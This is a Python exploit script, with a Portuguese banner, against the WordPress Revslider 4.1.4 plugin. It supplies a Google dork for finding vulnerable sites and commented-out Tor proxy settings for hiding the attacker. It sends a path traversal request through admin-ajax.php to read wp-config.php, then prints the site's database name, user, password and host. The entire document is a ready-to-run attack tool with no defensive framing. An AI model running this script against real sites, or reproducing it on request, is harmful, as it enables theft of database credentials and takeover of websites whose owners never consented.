import re
import urllib.request
import os
#import socks  
#import socket

os.system('cls' if os.name == 'nt' else 'clear')

#socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
#socket.socket = socks.socksocket

print("""-------------------------------------------------------------
|         Wordpres Plugin Revslider 4.1.4 Exploit           |
|                                                           |
|             Dork Google: revslider.php "index of"         |
|                                                           |
|     Vulnerabilidade Descoberta por: Claudio Viviani       |
|                                                           |
|         Exploit Desenvolvido por: SHOR & Bushido          |
-------------------------------------------------------------""")
 
def handling(content):
    return content.split(", ")[1].lstrip("\\'").rstrip("\\'")

target = input("Digite a URL: ")
vull = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
 
print("[*] TARGET:", target)
 
try:
    data = urllib.request.urlopen(target+vull)
except:
    print("[!] ERROR: O target não é vulnerável")
else:
    content = re.findall(r'define\((.+?)\);', str(data.read()))
    print("[+] DB_NOME:", handling(content[0]))
    print("[+] DB_USER:", handling(content[1]))
    print("[+] DB_PASS:", handling(content[2]))
    print("[+] DB_HOST:", handling(content[3]))